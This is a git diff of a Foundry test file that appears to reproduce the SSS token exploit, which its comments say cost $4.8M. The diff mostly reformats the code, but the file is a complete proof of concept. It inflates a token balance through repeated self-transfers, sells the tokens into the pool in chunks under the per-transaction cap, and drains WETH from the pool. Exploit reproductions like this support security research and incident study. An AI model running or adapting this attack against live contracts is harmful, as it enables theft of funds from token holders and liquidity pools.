@@ -3,6 +3,9 @@ pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IWETH} from "src/interfaces/IWETH.sol";
 // @KeyInfo - Total Lost: $4.8M
 // Attacker: 0x6a89a8C67B5066D59BF4D81d59f70C3976faCd0A
 // Attack Contract: 0xDed85d83Bf06069c0bD5AA792234b5015D5410A9
@@ -14,18 +17,18 @@ import "forge-std/Test.sol";
 // https://twitter.com/dot_pengun/status/1770989208125272481
 
 interface ISSS is IERC20 {
-
     function maxAmountPerTx() external view returns (uint256);
     function burn(uint256) external;
-
 }
 
 contract SSSExploit is Test {
-
     address private constant POOL = 0x92F32553cC465583d432846955198F0DDcBcafA1;
-    IWETH private constant WETH = IWETH(payable(0x4300000000000000000000000000000000000004));
-    ISSS private constant SSS = ISSS(0xdfDCdbC789b56F99B0d0692d14DBC61906D9Deed);
-    IUniswapV2Router private constant ROUTER_V2 = IUniswapV2Router(0x98994a9A7a2570367554589189dC9772241650f6);
+    IWETH private constant WETH =
+        IWETH(payable(0x4300000000000000000000000000000000000004));
+    ISSS private constant SSS =
+        ISSS(0xdfDCdbC789b56F99B0d0692d14DBC61906D9Deed);
+    IUniswapV2Router private constant ROUTER_V2 =
+        IUniswapV2Router(0x98994a9A7a2570367554589189dC9772241650f6);
     IUniswapV2Pair private sssPool = IUniswapV2Pair(POOL);
 
     uint256 ethFlashAmt = 1 ether;
@@ -45,7 +48,9 @@ contract SSSExploit is Test {
 
     function testExploit() public {
         emit log_named_decimal_uint(
-            "Attacker WETH balance before exploit", WETH.balanceOf(address(this)), WETH.decimals()
+            "Attacker WETH balance before exploit",
+            WETH.balanceOf(address(this)),
+            WETH.decimals()
         );
 
         //Emulate flashloan here with deal
@@ -55,11 +60,18 @@ contract SSSExploit is Test {
 
         //Buy 1 eth of tokens
         ROUTER_V2.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            ethFlashAmt, 0, getPath(true), address(this), block.timestamp
+            ethFlashAmt,
+            0,
+            getPath(true),
+            address(this),
+            block.timestamp
         );
 
         //Transfer to self until balance reaches target bal
-        uint256 targetBal = ROUTER_V2.getAmountsIn(WETH.balanceOf(POOL) - 29.5 ether, getPath(false))[0];
+        uint256 targetBal = ROUTER_V2.getAmountsIn(
+            WETH.balanceOf(POOL) - 29.5 ether,
+            getPath(false)
+        )[0];
         while (SSS.balanceOf(address(this)) < targetBal) {
             SSS.transfer(address(this), SSS.balanceOf(address(this)));
         }
@@ -73,24 +85,38 @@ contract SSSExploit is Test {
         uint256 maxAmountPerTx = SSS.maxAmountPerTx();
         uint256 SBalBeforeOnPair = SSS.balanceOf(POOL);
         while (tokensLeft > 0) {
-            uint256 toSell = tokensLeft > maxAmountPerTx ? maxAmountPerTx - 1 : tokensLeft;
+            uint256 toSell = tokensLeft > maxAmountPerTx
+                ? maxAmountPerTx - 1
+                : tokensLeft;
             SSS.transfer(POOL, toSell);
             tokensLeft -= toSell;
         }
 
         //Use swap function in pool to swap to weth
-        uint256 targetETH = ROUTER_V2.getAmountsOut(SSS.balanceOf(POOL) - SBalBeforeOnPair, getPath(false))[1];
+        uint256 targetETH = ROUTER_V2.getAmountsOut(
+            SSS.balanceOf(POOL) - SBalBeforeOnPair,
+            getPath(false)
+        )[1];
         sssPool.swap(targetETH, 0, address(this), new bytes(0));
 
         //Emulate paying back flashloan
         WETH.transfer(address(1), ethFlashAmt);
 
-        assertEq(WETH.balanceOf(address(this)), expectedETHAfter, "Not expected WETH BAL");
-        assertEq(SSS.balanceOf(address(this)), 0, "All SSS tokens didn't get sold");
+        assertEq(
+            WETH.balanceOf(address(this)),
+            expectedETHAfter,
+            "Not expected WETH BAL"
+        );
+        assertEq(
+            SSS.balanceOf(address(this)),
+            0,
+            "All SSS tokens didn't get sold"
+        );
 
         emit log_named_decimal_uint(
-            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
+            "Attacker WETH balance after exploit",
+            WETH.balanceOf(address(this)),
+            WETH.decimals()
         );
     }
-
 }
